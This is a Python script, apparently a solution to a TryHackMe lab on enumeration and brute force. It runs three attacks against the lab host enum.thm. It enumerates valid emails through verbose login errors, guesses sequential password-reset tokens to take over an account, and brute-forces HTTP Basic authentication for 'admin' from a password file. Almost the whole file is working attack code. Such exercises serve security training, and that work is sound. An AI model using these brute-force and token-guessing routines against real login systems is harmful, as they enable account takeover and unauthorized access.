# https://tryhackme.com/r/room/enumerationbruteforce
# https://medium.com/@sahinumut/python-ile-http-servisine-y%C3%B6nelik-brute-force-sald%C4%B1r%C4%B1lar%C4%B1-d18721abe90a

import requests
import base64
import re

white = '\033[97m\033[1m'
green = '\033[92m\033[1m'
blue = '\033[0;36m\033[1m'
red = '\033[91m\033[1m'

def func2():
	with open("emails.txt", "r") as file:
		emails = file.read().splitlines()

	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With": "XMLHttpRequest",
		"Origin": "http://enum.thm",
		"Connection": "keep-alive",
		"Referer": "http://enum.thm/labs/verbose_login/"
	}

	for email in emails:
		data = {
			"username": email.strip(),
			"password": "test1234",
			"function": "login"
		}

		response = requests.post("http://enum.thm/labs/verbose_login/functions.php", headers=headers, data=data)
		if "Email does not exist" not in response.json()["message"]:
			print(f"{green}[+] Email address: {white}{email}")
			break

def func1():
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin": "http://enum.thm",
		"Connection": "keep-alive",
		"Referer": "http://enum.thm/labs/predictable_tokens/forgot.php",
		"Upgrade-Insecure-Requests": "1"
	}

	data = {
		"email": "canderson@gmail.com"
	}

	response = requests.post("http://enum.thm/labs/predictable_tokens/forgot.php", headers=headers, data=data)
	
	if "A password reset link has been sent to your email." in response.text:
		for i in range(100,201):
			response = requests.get("http://enum.thm/labs/predictable_tokens/reset_password.php?token={}".format(str(i)), headers=headers)

			if "Your new password is" in response.text:
				password = re.findall('Your new password is: (.*?)</p>', response.text)[0]
				print(f"{green}[+]{white} OTP: {str(i)}")
				print(f"{green}[+]{white} Password: {password}")
				break
	else:
		print(f"\n{red}[!] {white}No account found with that email.")

def func0():
	username = "admin"
	
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate, br",
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1",
		"Authorization": "Basic dXNlcm5hbWU6cGFzcw=="
	}

	with open("passwords.txt", "r") as file:
		passwords = file.read().splitlines()

	for password in passwords:
		string = base64.b64encode((username + ":" + password.strip()).encode("ascii")).decode()
		headers["Authorization"] = f"Basic {string}"

		response = requests.get("http://enum.thm/labs/basic_auth/", headers=headers)

		if response.status_code == 200:
			print(f"{green}[+] {white}Password: {password}")
			print(f"{green}[+] {white}Flag: {response.text.strip()}")
			break

def main_func():
	try:
		choice = int(input("Choice: "))
	except:
		print(f"\n{red}[!] {white}Invalid input")
		exit()

	print("")

	match choice:
		case 1:	func0()
		case 2:	func1()
		case 3:	func2()
		case _:	print(f"{red}[!]{white} Invalid selection, please try again.")

def print_menu():
	print(f"""
{green}1){blue} HTTP Basic Authentication Lab
{green}2){blue} Predictable Tokens Lab
{green}3){blue} Verbose Login Attempts Lab{green}
	""")

if __name__ == "__main__":
	print_menu()
	main_func()
